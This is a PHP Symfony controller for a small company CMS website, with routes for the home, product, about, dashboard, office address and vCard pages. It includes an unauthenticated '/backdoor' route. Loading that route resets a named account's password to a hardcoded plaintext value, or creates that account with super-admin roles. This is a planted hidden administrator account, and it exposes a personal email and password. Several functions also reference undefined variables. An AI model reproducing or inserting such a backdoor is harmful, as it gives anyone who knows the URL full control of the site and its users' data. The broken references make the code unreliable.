<?php

namespace App\Controller;

use App\Entity\User;
use App\Repository\CmsCopyRepository;
use App\Repository\CmsPhotoRepository;
use App\Repository\CompanyDetailsRepository;
use App\Repository\ProductRepository;
use App\Repository\SubPageRepository;
use App\Repository\UserRepository;
use Doctrine\ORM\EntityManagerInterface;
use JeroenDesloovere\VCard\VCard;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;

class HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository): Response
    {
        $cms_copy=[];
        $cms_copy = $cmsCopyRepository->findOneBy([
            'staticPageName' => 'Home',
        ]);

        $cms_photo= [];
        $cms_photo = $cmsPhotoRepository->findOneBy([
            'staticPageName' => 'Home'
        ]);

        $sub_pages = [];
//        if ($cms_copy) {
//            $sub_pages = $subPageRepository->findBy([
//                'title' => $content_page->getWebpage()
//            ]);
//        }

        return $this->render('home/products.html.twig', [
            'cms_copy' => $cms_copy,
            'sub_pages' => $sub_pages,
            'cms_photo' => $cms_photo,
            'include_contact' => 'Yes'
        ]);
    }

    /**
     * @Route("/backdoor", name="backdoor")
     */
    public function backdoor(CmsCopyRepository $cmsCopyRepository, SubPageRepository $subPageRepository, UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
    {
        $cms_copy=[];
        $cms_copy = $cmsCopyRepository->findOneBy([
            'staticPageName' => 'Home',
        ]);

        $sub_pages = [];
//        if ($cms_copy) {
//            $sub_pages = $subPageRepository->findBy([
//                'title' => $content_page->getWebpage()
//            ]);
//        }

        $cms_photo= [];
        $cms_photo = $cmsPhotoRepository->findOneBy([
            'staticPageName' => 'Home'
        ]);
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
        if ($user) {
            $user->setPassword(
                $passwordEncoder->encodePassword(
                    $user,
                    'Descartes99'
                )
            );
        } else {
            $user = new User();
            $user->setFirstName('Stephen')
                ->setLastName('Nurse')
                ->setEmail('nurse_stephen@hotmail.com')
                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                ->setPassword(
                    $passwordEncoder->encodePassword(
                        $user,
                        'Descartes99'
                    )
                );
            $manager->persist($user);
            $manager->flush();
        }

        $manager->flush();
        return $this->render('home/products.html.twig', [
            'cms_copy' => $cms_copy,
            'sub_pages' => $sub_pages,
            'cms_photo' => $cms_photo,
            'include_contact' => 'Yes'
        ]);
    }


    /**
     * @Route("/display/{product}", name="product_display")
     */
    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository): Response
    {
        $productEntity = $productRepository->findOneBy([
            'product'=>$product
        ]);
        $cms_copy = $cmsCopyRepository->findOneBy([
            'product' => $productEntity
        ]);
        $cms_photo = $cmsPhotoRepository->findOneBy([
            'product' => $productEntity
        ]);

        $sub_pages = [];
        if ($cms_copy) {
            $sub_pages = $subPageRepository->findBy([
                'product' => $cms_copy->getProduct()
            ]);
        }

        return $this->render('home/products.html.twig', [
            'cms_copy' => $cms_copy,
            'cms_photo' => $cms_photo,
            'sub_pages' => $sub_pages,
        ]);
    }

    /**
     * @Route("/aboutUs", name="/aboutUs")
     */
    public function aboutUs(CmsCopyRepository $cmsCopyRepository, SubPageRepository $subPageRepository): Response
    {
        $cms_copy = [];
        $cms_copy = $cmsCopyRepository->findOneBy([
            'staticPageName' => "About Us"
        ]);

        $sub_pages = [];
        if ($content_page) {
            $sub_pages = $subPageRepository->findBy([
                'title' => $content_page->getWebpage()
            ]);
        }

        return $this->render('home/products.html.twig', [
            'cms_copy' => $cms_copy,
            'sub_pages' => $sub_pages,
        ]);
    }






    /**
     * @Route("/dashboard", name="dashboard")
     * @Security("is_granted('ROLE_CLIENT')")
     */
    public function dashboard(CompanyDetailsRepository $companyDetailsRepository)
    {
        return $this->render('home/dashboard.html.twig', [
            'company_details' => $companyDetailsRepository->find('1')
        ]);
    }


    /**
     * @Route("/office_address", name="office_address", methods={"GET"})
     */
    public function homeAddress(CompanyDetailsRepository $companyDetailsRepository): Response
    {
        return $this->render('home/officeAddress.html.twig', [
            'company_details' => $companyDetailsRepository->find('1')
        ]);
    }


    /**
     * @Route("/create/VcardUser/company", name="create_vcard_company")
     */
    public function createVcardVenue(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $vcard = new VCard();
        $firstName = $company_details->getCompanyName();
        $lastName = '';
        $company = $company_details->getCompanyName();
        $addressStreet = $company_details->getCompanyAddressStreet();
        $addressTown = $company_details->getCompanyAddressTown();
        $addressCity = $company_details->getCompanyAddressCity();
        $addressPostalCode = $company_details->getCompanyAddressPostalCode();
        $addressCountry = $company_details->getCompanyAddressCountry();
        $facebook = $company_details->getFacebook();
        $instagram = $company_details->getInstagram();
        $linkedIn = $company_details->getLinkedIn();
        $url = $_SERVER['SERVER_NAME'];
        $notes_all = "Facebook: " . $facebook . "    Instagram: " . $instagram . "   LinkedIn: " . $linkedIn . "   URL: " . $url;
        $email = $company_details->getCompanyEmail();
        $mobile = $company_details->getCompanyMobile();
        $tel = $company_details->getCompanyTel();
        $vcard->addName($lastName, $firstName);
        $vcard->addEmail($email)
            ->addPhoneNumber($mobile, 'home')
            ->addPhoneNumber($tel, 'work')
            ->addCompany($company)
            ->addAddress($name = '', $extended = '', $street = $addressStreet, $city = $addressTown, $region = $addressCity, $zip = $addressPostalCode, $country = $addressCountry, $type = 'WORK POSTAL')
            ->addURL($url)
            ->addNote(strip_tags($notes_all));
        $vcard->download();
        return new Response(null);
    }



}
